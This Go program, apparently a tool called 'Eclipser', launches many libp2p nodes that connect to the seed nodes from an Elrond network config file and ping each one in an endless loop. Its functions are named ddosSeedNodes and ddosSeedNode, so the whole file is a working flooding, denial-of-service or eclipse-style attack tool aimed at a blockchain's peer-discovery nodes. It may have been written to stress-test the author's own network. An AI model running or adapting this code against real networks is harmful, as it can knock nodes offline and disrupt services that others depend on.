package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/ElrondNetwork/elrond-go/core"
	"github.com/libp2p/go-libp2p"
	host "github.com/libp2p/go-libp2p-host"
	peerstore "github.com/libp2p/go-libp2p-peerstore"
	"github.com/libp2p/go-libp2p/p2p/protocol/ping"
	multiaddr "github.com/multiformats/go-multiaddr"
	"github.com/urfave/cli"
)

var (
	seedNodeHelpTemplate = `NAME:
   {{.Name}} - {{.Usage}}
USAGE:
   {{.HelpName}} {{if .VisibleFlags}}[global options]{{end}}
   {{if len .Authors}}
AUTHOR:
   {{range .Authors}}{{ . }}{{end}}
   {{end}}{{if .Commands}}
GLOBAL OPTIONS:
   {{range .VisibleFlags}}{{.}}
   {{end}}
VERSION:
   {{.Version}}
   {{end}}
`
	count = cli.IntFlag{
		Name:  "count",
		Usage: "How many seed ping nodes to launch",
		Value: 100,
	}

	startPort = cli.IntFlag{
		Name:  "start-port",
		Usage: "Which node to use as a basis for starting the pingers",
		Value: 13000,
	}

	configurationPath = cli.StringFlag{
		Name:  "config",
		Usage: "Path to p2p.toml config file",
		Value: "./config/p2p.toml",
	}

	p2pConfigurationPath = "./config/p2p.toml"
)

func main() {
	app := cli.NewApp()
	cli.AppHelpTemplate = seedNodeHelpTemplate
	app.Name = "Eclipser CLI App"
	app.Usage = "This is the entry point for starting a new eclipser app - the app will launch a bunch of seed nodes that essentially don't do anything"
	app.Flags = []cli.Flag{count, startPort, configurationPath}
	app.Version = "v0.0.1"
	app.Authors = []cli.Author{
		{
			Name:  "Sebastian Johnsson",
			Email: "",
		},
	}

	app.Action = func(c *cli.Context) error {
		return startApp(c)
	}

	err := app.Run(os.Args)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
}

func startApp(ctx *cli.Context) error {
	handleShutdown()

	if ctx.IsSet(configurationPath.Name) {
		p2pConfigurationPath = ctx.GlobalString(configurationPath.Name)
	}

	p2pConfig, err := core.LoadP2PConfig(p2pConfigurationPath)
	if err != nil {
		fmt.Println("Failed to parse P2P Config - make sure the config file exists!")
		os.Exit(1)
	}

	pingerCount := ctx.GlobalInt(count.Name)
	pingerStartPort := ctx.GlobalInt(startPort.Name)
	currentPort := pingerStartPort
	maxPort := 65500
	var waitGroup sync.WaitGroup

	for i := 0; i <= pingerCount; i++ {
		waitGroup.Add(1)
		if currentPort >= maxPort {
			currentPort = pingerStartPort
		} else {
			currentPort++
		}
		go ddosSeedNodes(currentPort, p2pConfig.KadDhtPeerDiscovery.InitialPeerList, &waitGroup)
	}

	waitGroup.Wait()

	return nil
}

func ddosSeedNodes(port int, seedNodeAddresses []string, waitGroup *sync.WaitGroup) error {
	defer waitGroup.Done()
	ctx := context.Background()

	node, err := libp2p.New(ctx,
		libp2p.ListenAddrStrings(fmt.Sprintf("/ip4/127.0.0.1/tcp/%d", port)),
		libp2p.Ping(false),
	)
	if err != nil {
		fmt.Sprintf("Error: %s\n", err.Error())
		return err
	}

	pingService := &ping.PingService{Host: node}
	node.SetStreamHandler(ping.ID, pingService.PingHandler)

	peerInfo := &peerstore.PeerInfo{
		ID:    node.ID(),
		Addrs: node.Addrs(),
	}

	addrs, err := peerstore.InfoToP2pAddrs(peerInfo)
	if err != nil {
		fmt.Sprintf("Error: %s\n", err.Error())
		return err
	}

	fmt.Println("libp2p node address:", addrs[0])

	var innerWaitGroup sync.WaitGroup

	for _, seedNodeAddress := range seedNodeAddresses {
		innerWaitGroup.Add(1)
		go ddosSeedNode(ctx, node, pingService, seedNodeAddress, &innerWaitGroup)
	}

	innerWaitGroup.Wait()

	return nil
}

func ddosSeedNode(ctx context.Context, node host.Host, pingService *ping.PingService, seedNodeAddress string, innerWaitGroup *sync.WaitGroup) error {
	defer innerWaitGroup.Done()
	addr, err := multiaddr.NewMultiaddr(seedNodeAddress)
	if err != nil {
		fmt.Sprintf("Error: %s\n", err.Error())
		return err
	}

	peer, err := peerstore.InfoFromP2pAddr(addr)
	if err != nil {
		fmt.Sprintf("Error: %s\n", err.Error())
		return err
	}

	if err = node.Connect(ctx, *peer); err != nil {
		fmt.Sprintf("Error: %s\n", err.Error())
		return err
	}

	ch := pingService.Ping(ctx, peer.ID)

	for {
		fmt.Println("sending ping message to", seedNodeAddress)
		res := <-ch
		fmt.Println("pinged", seedNodeAddress, "in", res.RTT)
	}

	return nil
}

func handleShutdown() {
	sigs := make(chan os.Signal)
	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigs
		os.Exit(0)
	}()
}
